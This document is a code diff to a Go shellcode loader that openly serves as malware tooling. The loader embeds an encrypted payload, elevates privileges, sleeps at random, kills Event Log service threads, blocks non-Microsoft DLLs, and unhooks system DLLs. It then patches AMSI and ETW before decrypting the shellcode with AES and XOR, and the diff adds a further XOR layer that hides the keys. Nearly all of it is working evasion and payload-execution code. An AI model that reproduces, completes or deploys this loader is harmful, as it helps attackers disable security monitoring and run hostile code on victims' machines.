@@ -8,7 +8,7 @@ import (
 	"fmt"
 	"log"
 	"main/utils/AMSI_EDR"
-	DLLBlocker "main/utils/BLOCKER"
+	"main/utils/BLOCKER"
 	"main/utils/CleanMemory"
 	"main/utils/EVENT_LOG"
 	"main/utils/Indirect"
@@ -21,9 +21,10 @@ import (
 //go:embed encrypted_loader.bin
 var encryptedShellcode []byte
 
-const (
-	aesKeyHex = "%KEYAES%"
-	xorKeyHex = "%KEYXOR%"
+var (
+	aesKey, _    = hex.DecodeString("%KEYAES%")
+	xorKey, _    = hex.DecodeString("%KEYXOR%")
+	XORAESKey, _ = hex.DecodeString("%XORAESKEY%")
 )
 
 func verifyDataIntegrity(data []byte, stage string) bool {
@@ -38,6 +39,11 @@ func verifyDataIntegrity(data []byte, stage string) bool {
 
 func aesDecrypt(ciphertext, key []byte) ([]byte, error) {
 	log.Printf("[*] Starting AES decryption - Input size: %d bytes", len(ciphertext))
+
+	// Ensure the decrypted AES key is of a valid size
+	if len(key) != 16 && len(key) != 24 && len(key) != 32 {
+		return nil, fmt.Errorf("[-] Invalid AES key size: %d bytes", len(key))
+	}
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -78,6 +84,19 @@ func xorDecrypt(data, key []byte) ([]byte, error) {
 	return data, nil
 }
 
+func decryptkey(data, key []byte) ([]byte, error) {
+	keyLen := len(key)
+	if keyLen == 0 {
+		log.Fatalf("[-] XOR decryption failed: empty key")
+		return nil, fmt.Errorf("[-] invalid XOR key length: key cannot be empty")
+	}
+
+	for i := 0; i < len(data); i++ {
+		data[i] ^= key[i%keyLen]
+	}
+	return data, nil
+}
+
 func main() {
 	log.SetFlags(0)
 
@@ -88,14 +107,12 @@ func main() {
 	}
 	fmt.Println("[+] Process elevated")
 
-	// Sleep for a random duration between 1 and 15 seconds
 	rand.Seed(time.Now().UnixNano())
 	sleepDuration := time.Duration(rand.Intn(15)+1) * time.Second
 	fmt.Printf("[+] Sleeping for %v\n", sleepDuration)
 	time.Sleep(sleepDuration)
 	fmt.Println("[+] Woke Up ... Execution Continues")
 
-	// Get the process ID of the Event Log service
 	eventlogPid, err := EVENT_LOG.GetEventLogPid()
 	if err != nil {
 		log.Fatalf("[-] Failed to get Event Log PID: %v", err)
@@ -103,7 +120,6 @@ func main() {
 	}
 	log.Printf("[+] Event Log PID: %d", eventlogPid)
 
-	// Call the Phant0m function to terminate threads of the Event Log service
 	err = EVENT_LOG.Phant0m(eventlogPid)
 	if err != nil {
 		log.Fatalf("[-] Failed to terminate Event Log threads: %v", err)
@@ -111,7 +127,6 @@ func main() {
 	}
 	log.Println("[+] Successfully terminated Event Log threads")
 
-	// Block non-Microsoft-signed DLLs
 	fmt.Println("[*] Blocking non-Microsoft-signed DLLs")
 	if err := DLLBlocker.BlockDLLs(); err != nil {
 		log.Fatalf("[-] Failed to block non-Microsoft-signed DLLs: %v", err)
@@ -119,7 +134,6 @@ func main() {
 	}
 	fmt.Println("[+] Non-Microsoft-signed DLLs blocked")
 
-	// Unhook DLLs
 	fmt.Println("[*] Unhooking DLLs")
 	dllsToUnhook := []string{"ntdll.dll", "kernel32.dll", "user32.dll", "advapi32.dll", "amsi.dll"}
 	if err := Unhook.FullUnhook(dllsToUnhook); err != nil {
@@ -132,19 +146,37 @@ func main() {
 	AMSI_EDR.ExecuteAllPatches()
 	log.Printf("[+] Patched Amsi And ETW")
 
-	aesKey, err := hex.DecodeString(aesKeyHex)
+	DecryptedAESKEY, err := decryptkey(aesKey, XORAESKey)
 	if err != nil {
-		log.Fatalf("[-] Failed to decode AES key: %v", err)
+		log.Fatalf("[-] Failed to decrypt AES key: %v", err)
 		return
 	}
-	defer CleanMemory.ZeroizeMemory(aesKey)
 
-	xorKey, err := hex.DecodeString(xorKeyHex)
+	// Decode the decrypted AES key from hex
+	DecryptedAESKEY, err = hex.DecodeString(string(DecryptedAESKEY))
 	if err != nil {
-		log.Fatalf("[-] Failed to decode XOR key: %v", err)
+		log.Fatalf("[-] Failed to decode AES key from hex: %v", err)
 		return
 	}
-	defer CleanMemory.ZeroizeMemory(xorKey)
+
+	fmt.Println("[+] Decrypted AES key: ", string(DecryptedAESKEY))
+	defer CleanMemory.ZeroizeMemory(DecryptedAESKEY)
+
+	DecryptedXORKEY, err := decryptkey(xorKey, XORAESKey)
+	if err != nil {
+		log.Fatalf("[-] Failed to decrypt XOR key: %v", err)
+		return
+	}
+
+	// Decode the decrypted XOR key from hex
+	DecryptedXORKEY, err = hex.DecodeString(string(DecryptedXORKEY))
+	if err != nil {
+		log.Fatalf("[-] Failed to decode XOR key from hex: %v", err)
+		return
+	}
+
+	fmt.Println("[+] Decrypted XOR key: ", string(DecryptedXORKEY))
+	defer CleanMemory.ZeroizeMemory(DecryptedXORKEY)
 
 	if !verifyDataIntegrity(encryptedShellcode, "encrypted") {
 		log.Fatalf("[-] Encrypted shellcode integrity check failed.")
@@ -152,7 +184,7 @@ func main() {
 	}
 
 	log.Printf("[*] Starting AES decryption")
-	aesDecrypted, err := aesDecrypt(encryptedShellcode, aesKey)
+	aesDecrypted, err := aesDecrypt(encryptedShellcode, DecryptedAESKEY)
 	if err != nil {
 		log.Fatalf("[-] AES decryption failed: %v", err)
 		return
@@ -160,7 +192,7 @@ func main() {
 	defer CleanMemory.ZeroizeMemory(aesDecrypted)
 
 	log.Printf("[*] Starting XOR decryption")
-	shellcode, err := xorDecrypt(aesDecrypted, xorKey)
+	shellcode, err := xorDecrypt(aesDecrypted, DecryptedXORKEY)
 	if err != nil {
 		log.Fatalf("[-] XOR decryption failed: %v", err)
 		return
